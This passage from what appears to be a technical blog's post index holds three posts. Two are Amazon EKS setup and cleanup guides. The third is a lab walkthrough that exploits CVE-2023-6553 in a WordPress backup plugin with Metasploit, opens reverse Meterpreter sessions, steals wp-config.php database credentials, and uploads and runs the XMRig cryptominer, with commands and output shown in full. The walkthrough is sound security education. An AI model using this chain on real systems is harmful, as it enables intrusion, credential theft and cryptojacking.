\".${CLUSTER_FQDN}\" authenticatedEmailsFile: enabled: true restricted_access: |- ${MY_EMAIL} ingress: enabled: true className: nginx hosts: - oauth2-proxy.${CLUSTER_FQDN} tls: - hosts: - oauth2-proxy.${CLUSTER_FQDN} metrics: servicemonitor: enabled: true EOF helm upgrade --install --version \"${OAUTH2_PROXY_HELM_CHART_VERSION}\" --namespace oauth2-proxy --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" oauth2-proxy oauth2-proxy/oauth2-proxy kubectl label namespace oauth2-proxy pod-security.kubernetes.io/enforce=baseline Clean-up Remove the EKS cluster and its created components: if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi Remove the Route 53 DNS records from the DNS Zone: CLUSTER_FQDN_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${CLUSTER_FQDN}.\\`].Id\" --output text) if [[ -n \"${CLUSTER_FQDN_ZONE_ID}\" ]]; then aws route53 list-resource-record-sets --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" | jq -c '.ResourceRecordSets[] | select (.Type != \"SOA\" and .Type != \"NS\")' | while read -r RESOURCERECORDSET; do aws route53 change-resource-record-sets \\ --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" \\ --change-batch '{\"Changes\":[{\"Action\":\"DELETE\",\"ResourceRecordSet\": '\"${RESOURCERECORDSET}\"' }]}' \\ --output text --query 'ChangeInfo.Id' done fi Delete launch templates created by Karpenter: aws ec2 describe-launch-templates --filters \"Name=tag:karpenter.k8s.aws/cluster,Values=${CLUSTER_NAME}\" | jq -r \".LaunchTemplates[].LaunchTemplateName\" | xargs -I{} aws ec2 delete-launch-template --launch-template-name {} Remove volumes and snapshots related to the cluster (as a precaution): for VOLUME in $(aws ec2 describe-volumes --filter \"Name=tag:KubernetesCluster,Values=${CLUSTER_NAME}\" \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" --query 'Volumes[].VolumeId' --output text); do echo \"*** Removing Volume: ${VOLUME}\" aws ec2 delete-volume --volume-id \"${VOLUME}\" done Remove the CloudWatch log group: if [[ \"$(aws logs describe-log-groups --query \"logGroups[?logGroupName==\\`/aws/eks/${CLUSTER_NAME}/cluster\\`] | [0].logGroupName\" --output text)\" = \"/aws/eks/${CLUSTER_NAME}/cluster\" ]]; then aws logs delete-log-group --log-group-name \"/aws/eks/${CLUSTER_NAME}/cluster\" fi Remove any orphan EC2 instances created by Karpenter: for EC2 in $(aws ec2 describe-instances --filters \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" Name=instance-state-name,Values=running --query \"Reservations[].Instances[].InstanceId\" --output text); do echo \"Removing EC2: ${EC2}\" aws ec2 terminate-instances --instance-ids \"${EC2}\" done Remove the CloudFormation stack: aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-route53-kms-karpenter\" aws cloudformation wait stack-delete-complete --stack-name \"${CLUSTER_NAME}-route53-kms-karpenter\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${CLUSTER_NAME}-cluster\" Remove the ${TMP_DIR}/${CLUSTER_FQDN} directory: if [[ -d \"${TMP_DIR}/${CLUSTER_FQDN}\" ]]; then for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{kubeconfig-${CLUSTER_NAME}.conf,{aws-cf-route53-kms-karpenter,eksctl-${CLUSTER_NAME},k8s-karpenter-nodepool-ec2nodeclass,helm_values-{aws-ebs-csi-driver,aws-load-balancer-controller,cert-manager,external-dns,forecastle,ingress-nginx,karpenter,kube-prometheus-stack,mailpit,oauth2-proxy},k8s-cert-manager-{certificate,clusterissuer}-staging}.yml}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done rmdir \"${TMP_DIR}/${CLUSTER_FQDN}\" fi Enjoy ‚Ä¶ üòâ" }, { "title": "Exploit vulnerability in a WordPress plugin with Kali Linux", "url": "/posts/exploit-vulnerability-wordpress-plugin-kali-linux-1/", "categories": "Kubernetes, Amazon EKS, Security, Exploit, Vulnerability, Kali Linux", "tags": "Amazon EKS, k8s, kubernetes, security, eksctl, Kali Linux, exploit, vulnerability, WordPress, plugin", "date": "2024-04-27 00:00:00 +0200", "content": "For educational purposes, it can be useful to learn how to exploit a vulnerability in a WordPress plugin running on Amazon EKS using Kali Linux. I will cover the following steps: Install an Amazon EKS cluster Install a vulnerable WordPress application to Kubernetes (K8s) Install Kali Linux on an EC2 instance Exploit a vulnerability in a WordPress plugin using Kali Linux and Metasploit Set necessary environment variables and download CloudFormation templates Requirements: AWS CLI eksctl kubectl helm Set the required AWS environment variables: export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_REGION=\"eu-central-1\" AWS_EC2_KEY_PAIR_NAME=\"ruzickap-test\" TMP_DIR=\"${TMP_DIR:-${PWD}}\" Download the CloudFormation templates for Kali Linux and the VPC: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/e43fe99f21b02635873bddeed92b669e8e5156d3/ci_tools/vpc_cloudformation_template.yml wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/b5e676d847da88e95f7227b8da96c2e4f28f88f3/cfn/KaliLinux-NICE-DCV.yaml Create a new AWS EC2 Key Pair: aws ec2 create-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" --key-type ed25519 --query \"KeyMaterial\" --output text &gt; \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" chmod 600 \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" Run Kali Linux on Amazon EC2 instance Create an AWS EC2 instance with Kali Linux using the CloudFormation template: export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" aws cloudformation deploy --capabilities CAPABILITY_IAM \\ --parameter-overrides \"EnvironmentName=${SOLUTION_KALI}\" \\ --stack-name \"${SOLUTION_KALI}-VPC\" --template-file \"${TMP_DIR}/vpc_cloudformation_template.yml\" \\ --tags \"Owner=${USER} Environment=dev Solution=${SOLUTION_KALI}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_KALI}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") eval aws cloudformation create-stack --capabilities CAPABILITY_AUTO_EXPAND CAPABILITY_IAM \\ --parameters \"ParameterKey=ec2KeyPair,ParameterValue=${AWS_EC2_KEY_PAIR_NAME} ParameterKey=vpcID,ParameterValue=${AWS_VPC_ID} ParameterKey=subnetID,ParameterValue=${AWS_SUBNET_ID} ParameterKey=allowWebServerPorts,ParameterValue=HTTP-and-HTTPS\" \\ --stack-name \"${SOLUTION_KALI}\" --template-body \"file://${TMP_DIR}/KaliLinux-NICE-DCV.yaml\" \\ --tags \"Key=Owner,Value=${USER} Key=Environment,Value=dev Key=Solution,Value=${SOLUTION_KALI}\" Install Amazon EKS cluster and vulnerable Wordpress Application Let‚Äôs look at how to install the Amazon EKS cluster and the vulnerable WordPress application. Install the Amazon EKS cluster Install the Amazon EKS cluster using eksctl: export SOLUTION_EKS=\"Amazon-EKS\" export KUBECONFIG=\"${TMP_DIR}/kubeconfig-${SOLUTION_EKS}.conf\" eksctl create cluster \\ --name \"${SOLUTION_EKS}\" --tags \"Owner=${USER},Solution=${SOLUTION_EKS},Cluster=${SOLUTION_EKS}\" \\ --node-type t3a.medium --node-volume-size 20 --node-private-networking \\ --kubeconfig \"${KUBECONFIG}\" Install vulnerable Wordpress Application Install the vulnerable WordPress application to the Amazon EKS cluster using a Helm chart, and modify its default values: WORDPRESS_HELM_CHART_VERSION=\"22.1.3\" tee \"${TMP_DIR}/helm_values-wordpress.yml\" &lt;&lt; EOF wordpressUsername: wordpress wordpressPassword: $(openssl rand -base64 12) customPostInitScripts: install_plugins.sh: | wp plugin install backup-backup --version=1.3.7 --activate persistence: enabled: false mariadb: primary: persistence: enabled: false EOF helm upgrade --install --version \"${WORDPRESS_HELM_CHART_VERSION}\" --namespace wordpress --create-namespace --wait --values \"${TMP_DIR}/helm_values-wordpress.yml\" wordpress oci://registry-1.docker.io/bitnamicharts/wordpress Version 1.3.7 of the vulnerable WordPress Backup Migration Plugin was installed. Let‚Äôs get the LoadBalancer / WordPress URL: K8S_WORDPRESS_SERVICE=$(kubectl get services --namespace wordpress wordpress --output jsonpath='{.status.loadBalancer.ingress[0].hostname}') Summarize the WordPress URL, Admin URL, Username, and Password: echo \"WordPress URL: http://${K8S_WORDPRESS_SERVICE}/\" echo \"WordPress Admin URL: http://${K8S_WORDPRESS_SERVICE}/admin\" echo \"Username: wordpress\" echo \"Password: $(kubectl get secret --namespace wordpress wordpress -o jsonpath='{.data.wordpress-password}' | base64 -d)\" WordPress URL: http://ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com/ WordPress Admin URL: http://ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com/admin Username: wordpress Password: a6jnQ16JZS5TLLri Attack the Wordpress Application The following commands run the Metasploit Framework to exploit a vulnerability in the WordPress Backup Migration Plugin. Details about the vulnerability can be found here: WordPress Backup Migration Plugin PHP Filter Chain RCE Vulnerability Details : CVE-2023-6553 CVE-2023-6553 Exploit V2 CVE-2023-6553 Detail Allow your user to connect using SSH: AWS_EC2_KALI_LINUX_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_KALI}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' Log in to the Kali Linux instance using SSH and perform the following steps: Download the XMRig cryptominer Install Metasploit Framework Initialize the Metasploit Framework Use wordpress_scanner auxiliary module to scan the WordPress Application Use wp_backup_migration_php_filter exploit module to exploit the WordPress plugin vulnerability Upload the cryptominer to the remote host Execute the cryptominer (run the XMRig binary with the --version option) Download the WordPress config file wp-config.php and print the database credentials Metasploit logo # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" &lt;&lt; EOF2 curl -Ls https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz | tar -xvzf - --strip-components=1 --wildcards \"*/xmrig\" sudo snap install metasploit-framework msfdb init cat &lt;&lt; EOF | msfconsole --quiet --resource - use auxiliary/scanner/http/wordpress_scanner set rhost ${K8S_WORDPRESS_SERVICE} run use exploit/multi/http/wp_backup_migration_php_filter set rhost ${K8S_WORDPRESS_SERVICE} set lhost ${AWS_EC2_KALI_LINUX_PUBLIC_IP} set lport 443 run sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo \\ --meterpreter-command \"download /bitnami/wordpress/wp-config.php\" \\ --meterpreter-command \"upload xmrig /tmp/xmrig\" \\ --meterpreter-command \"execute -i -H -f /usr/bin/sh -a '-c \\\"chmod a+x /tmp/xmrig ; /tmp/xmrig --version\\\"'\" exit -y EOF grep DB_ wp-config.php EOF2 ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ curl -Ls https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz | tar -xvzf - --strip-components=1 --wildcards \"*/xmrig\" xmrig-6.21.3/xmrig ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ sudo snap install metasploit-framework metasploit-framework v6.4.4-dev from Jitendra Patro (jitpatro) installed WARNING: There is 1 new warning. See 'snap warnings'. ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ msfdb init Running the 'init' command for the database: Creating database at /home/kali/snap/metasploit-framework/common/.msf4/db Creating db socket file at /home/kali/snap/metasploit-framework/common Starting database at /home/kali/snap/metasploit-framework/common/.msf4/db...server starting success Creating database users Writing client authentication configuration file /home/kali/snap/metasploit-framework/common/.msf4/db/pg_hba.conf Stopping database at /home/kali/snap/metasploit-framework/common/.msf4/db Starting database at /home/kali/snap/metasploit-framework/common/.msf4/db...server starting success Creating initial database schema Database initialization successful ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ msfconsole --quiet ** Welcome to Metasploit Framework Initial Setup ** Please answer a few questions to get started. ** Metasploit Framework Initial Setup Complete ** This copy of metasploit-framework is more than two weeks old. Consider running 'msfupdate' to update to the latest version. msf6 &gt; use auxiliary/scanner/http/wordpress_scanner msf6 auxiliary(scanner/http/wordpress_scanner) &gt; set rhost ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com rhost =&gt; ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com msf6 auxiliary(scanner/http/wordpress_scanner) &gt; run [*] Trying 3.73.29.183 [+] 3.73.29.183 - Detected Wordpress 6.5 [*] 3.73.29.183 - Enumerating Themes [*] 3.73.29.183 - Progress 0/3 (0.0%) [*] 3.73.29.183 - Finished scanning themes [*] 3.73.29.183 - Enumerating plugins [*] 3.73.29.183 - Progress 0/63 (0.0%) [+] 3.73.29.183 - Detected plugin: all-in-one-wp-migration version 7.81 [+] 3.73.29.183 - Detected plugin: backup-backup version 1.3.7 [*] 3.73.29.183 - Finished scanning plugins [*] 3.73.29.183 - Searching Users [+] 3.73.29.183 - Detected user: wordpress with username: wordpress [*] 3.73.29.183 - Finished scanning users [*] 3.73.29.183 - Finished all scans [*] Scanned 1 of 2 hosts (50% complete) [*] Trying 3.120.25.116 [+] 3.120.25.116 - Detected Wordpress 6.5 [*] 3.120.25.116 - Enumerating Themes [*] 3.120.25.116 - Progress 0/3 (0.0%) [*] Scanned 1 of 2 hosts (50% complete) [*] Scanned 1 of 2 hosts (50% complete) [*] 3.120.25.116 - Finished scanning themes [*] 3.120.25.116 - Enumerating plugins [*] 3.120.25.116 - Progress 0/63 (0.0%) [*] Scanned 1 of 2 hosts (50% complete) [*] Scanned 1 of 2 hosts (50% complete) [+] 3.120.25.116 - Detected plugin: all-in-one-wp-migration version 7.81 [+] 3.120.25.116 - Detected plugin: backup-backup version 1.3.7 [*] 3.120.25.116 - Finished scanning plugins [*] 3.120.25.116 - Searching Users [+] 3.120.25.116 - Detected user: wordpress with username: wordpress [*] 3.120.25.116 - Finished scanning users [*] 3.120.25.116 - Finished all scans [*] Scanned 2 of 2 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/http/wordpress_scanner) &gt; msf6 auxiliary(scanner/http/wordpress_scanner) &gt; use exploit/multi/http/wp_backup_migration_php_filter [*] Using configured payload php/meterpreter/reverse_tcp msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; set rhost ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com rhost =&gt; ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; set lhost 52.57.50.4 lhost =&gt; 52.57.50.4 msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; set lport 443 lport =&gt; 443 msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; run [*] Exploiting target 3.73.29.183 [-] Handler failed to bind to 52.57.50.4:443:- - [*] Started reverse TCP handler on 0.0.0.0:443 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] WordPress Version: 6.5 [+] Detected Backup Migration Plugin version: 1.3.7 [+] The target appears to be vulnerable. [*] Writing the payload to disk, character by character, please wait... [*] Sending stage (39927 bytes) to 3.74.38.166 [+] Deleted j [+] Deleted erpY.php [*] Meterpreter session 1 opened (10.192.10.73:443 -&gt; 3.74.38.166:38454) at 2024-04-30 07:08:44 +0000 [*] Session 1 created in the background. [*] Exploiting target 3.120.25.116 [-] Handler failed to bind to 52.57.50.4:443:- - [*] Started reverse TCP handler on 0.0.0.0:443 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] WordPress Version: 6.5 [+] Detected Backup Migration Plugin version: 1.3.7 [+] The target appears to be vulnerable. [*] Writing the payload to disk, character by character, please wait... [*] Sending stage (39927 bytes) to 3.74.38.166 [+] Deleted t [+] Deleted erpY.php [*] Meterpreter session 2 opened (10.192.10.73:443 -&gt; 3.74.38.166:43951) at 2024-04-30 07:09:43 +0000 [*] Session 2 created in the background. msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; sessions --interact 1 [*] Starting interaction with 1... meterpreter &gt; ps Process List ============ PID Name User Path --- ---- ---- ---- 1 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 301 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 302 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 303 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 304 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 305 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 306 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 308 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 309 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 310 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 311 sh 1001 sh -c ps ax -w -o pid,user,cmd --no-header 2&gt;/dev/null 312 ps 1001 ps ax -w -o pid,user,cmd --no-header meterpreter &gt; meterpreter &gt; sysinfo Computer : wordpress-7c5479f8-n846l OS : Linux wordpress-7c5479f8-n846l 5.10.213-201.855.amzn2.x86_64 #1 SMP Mon Mar 25 18:16:11 UTC 2024 x86_64 Meterpreter : php/linux meterpreter &gt; meterpreter &gt; download /bitnami/wordpress/wp-config.php [*] Downloading: /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php [*] Downloaded 4.19 KiB of 4.19 KiB (100.0%): /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php [*] Completed : /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php meterpreter &gt; meterpreter &gt; upload xmrig /tmp/xmrig [*] Uploading : /home/kali/xmrig -&gt; /tmp/xmrig [*] Uploaded -1.00 B of 7.90 MiB (0.0%): /home/kali/xmrig -&gt; /tmp/xmrig [*] Completed : /home/kali/xmrig -&gt; /tmp/xmrig meterpreter &gt; meterpreter &gt; execute -i -H -f /usr/bin/sh -a '-c \"chmod a+x /tmp/xmrig ; /tmp/xmrig --version\"' Process 316 created. Channel 3 created. XMRig 6.21.3 built on Apr 23 2024 with GCC 13.2.1 features: 64-bit AES libuv/1.48.0 OpenSSL/3.0.13 hwloc/2.10.0 [-] core_channel_interact: Operation failed: 1 meterpreter &gt; exit -y [*] Shutting down session: 1 [*] 3.73.29.183 - Meterpreter session 1 closed. Reason: User exit msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; exit -y ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ grep DB_ wp-config.php define( 'DB_NAME', 'bitnami_wordpress' ); define( 'DB_USER', 'bn_wordpress' ); define( 'DB_PASSWORD', 'vAX0wwd3wR' ); define( 'DB_HOST', 'wordpress-mariadb:3306' ); define( 'DB_CHARSET', 'utf8' ); define( 'DB_COLLATE', '' ); I really like Metasploit‚Äôs colors, so I‚Äôve added the logs as images here: Metasploit - wordpress_scanner Metasploit - wp_backup_migration_php_filter The Metasploit Framework can do many other things with an exploited host. These are basic commands that should be detected by security tools (e.g., Kubernetes runtime protection). Cleanup Delete the Amazon EKS cluster, the Kali Linux EC2 instance, and the EC2 Key Pair: export AWS_REGION=\"eu-central-1\" export AWS_EC2_KEY_PAIR_NAME=\"ruzickap-test\" export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" export SOLUTION_EKS=\"Amazon-EKS\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${TMP_DIR}/kubeconfig-${SOLUTION_EKS}.conf\" aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}\" aws ec2 delete-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" if eksctl get cluster --name=\"${SOLUTION_EKS}\"; then eksctl delete cluster --name=\"${SOLUTION_EKS}\" --force fi aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}-VPC\" for FILE in ${TMP_DIR}/{vpc_cloudformation_template.yml,KaliLinux-NICE-DCV.yaml,${AWS_EC2_KEY_PAIR_NAME}.pem,helm_values-wordpress.yml,kubeconfig-${SOLUTION_EKS}.conf}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done aws cloudformation wait stack-delete-complete --stack-name \"${SOLUTION_KALI}\" aws cloudformation wait stack-delete-complete --stack-name \"${SOLUTION_KALI}-VPC\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${SOLUTION_EKS}-cluster\" Enjoy ‚Ä¶ üòâ" }, { "title": "Build secure and cheap Amazon EKS", "url": "/posts/secure-cheap-amazon-eks/", "categories": "Kubernetes, Amazon EKS, Security", "tags": "Amazon EKS, k8s, kubernetes, security, eksctl, cert-manager, external-dns, podinfo, prometheus, sso, oauth2-proxy, metrics-server", "date": "2023-09-25 00:00:00 +0200", "content": "I will outline the steps for setting up an Amazon EKS environment that is both cost-effective and prioritizes security, including the configuration of standard applications. The Amazon EKS setup should align with the following cost-effectiveness criteria: Utilize two Availability Zones (AZs), or a single zone if possible, to reduce payments for cross-AZ traffic Spot instances Less expensive region - us-east-1 Most price efficient EC2 instance type t4g.medium (2 x CPU, 4GB RAM) using AWS Graviton based on ARM Use Bottlerocket OS for a minimal operating system, CPU, and memory footprint Use Network Load Balancer (NLB) as a most cost efficient + cost optimized load balancer Karpenter to enable automatic node scaling that matches the specific resource requirements of pods The Amazon EKS setup should also meet the following security requirements: The Amazon EKS control plane must be encrypted using KMS Worker node EBS volumes must be encrypted Cluster logging to CloudWatch must be configured Network Policies should be enabled where supported Build Amazon EKS cluster Requirements You will need to configure the AWS CLI and set up other necessary secrets and variables. # AWS Credentials export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_SESSION_TOKEN=\"xxxxxxxx\" export AWS_ROLE_TO_ASSUME=\"arn:aws:iam::7xxxxxxxxxx7:role/Gixxxxxxxxxxxxxxxxxxxxle\" export GOOGLE_CLIENT_ID=\"10xxxxxxxxxxxxxxxud.apps.googleusercontent.com\" export GOOGLE_CLIENT_SECRET=\"GOxxxxxxxxxxxxxxxtw\" If you plan to follow this document and its tasks, you will need to set up a few environment variables, such as: # AWS Region export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" # Hostname / FQDN definitions export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \"Account\" --output text) &amp;&amp; export AWS_ACCOUNT_ID mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Confirm that all essential variables have been properly configured: : \"${AWS_ACCESS_KEY_ID?}\" : \"${AWS_DEFAULT_REGION?}\" : \"${AWS_SECRET_ACCESS_KEY?}\" : \"${AWS_ROLE_TO_ASSUME?}\" : \"${GOOGLE_CLIENT_ID?}\" : \"${GOOGLE_CLIENT_SECRET?}\" echo -e \"${MY_EMAIL} | ${CLUSTER_NAME} | ${BASE_DOMAIN} | ${CLUSTER_FQDN}\\n${TAGS}\" Install the required tools: You can bypass these procedures if you already have all the essential software installed. AWS CLI eksctl kubectl helm Configure AWS Route 53 Domain delegation The DNS delegation tasks should be executed as a one-time operation. Create a DNS zone for the EKS clusters: export CLOUDFLARE_EMAIL=\"petr.ruzicka@gmail.com\" export CLOUDFLARE_API_KEY=\"1xxxxxxxxx0\" aws route53 create-hosted-zone --output json \\ --name \"${BASE_DOMAIN}\" \\ --caller-reference \"$(date)\" \\ --hosted-zone-config=\"{\\\"Comment\\\": \\\"Created by petr.ruzicka@gmail.com\\\", \\\"PrivateZone\\\": false}\" | jq Route53 k8s.mylabs.dev zone Utilize your domain registrar to update the nameservers for your zone (e.g., mylabs.dev) to point to the Amazon Route 53 nameservers. Here‚Äôs how to discover the required Route 53 nameservers: NEW_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${BASE_DOMAIN}.\\`].Id\" --output text) NEW_ZONE_NS=$(aws route53 get-hosted-zone --output json --id \"${NEW_ZONE_ID}\" --query \"DelegationSet.NameServers\") NEW_ZONE_NS1=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[0]\") NEW_ZONE_NS2=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[1]\") Establish the NS record in k8s.mylabs.dev (your BASE_DOMAIN) for proper zone delegation. This operation‚Äôs specifics may vary based on your domain registrar; I use Cloudflare and employ Ansible for automation: ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS1} solo=true proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS2} solo=false proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-885.awsdns-46.net\", \"created_on\": \"2020-11-13T06:25:32.18642Z\", \"id\": \"dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:32.18642Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-1692.awsdns-19.co.uk\", \"created_on\": \"2020-11-13T06:25:37.605605Z\", \"id\": \"9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:37.605605Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } CloudFlare mylabs.dev zone Create Route53 zone and KMS key Generate a CloudFormation template that defines an Amazon Route 53 zone and an AWS Key Management Service (KMS) key. Add the new domain CLUSTER_FQDN to Route 53, and set up DNS delegation from the BASE_DOMAIN. tee 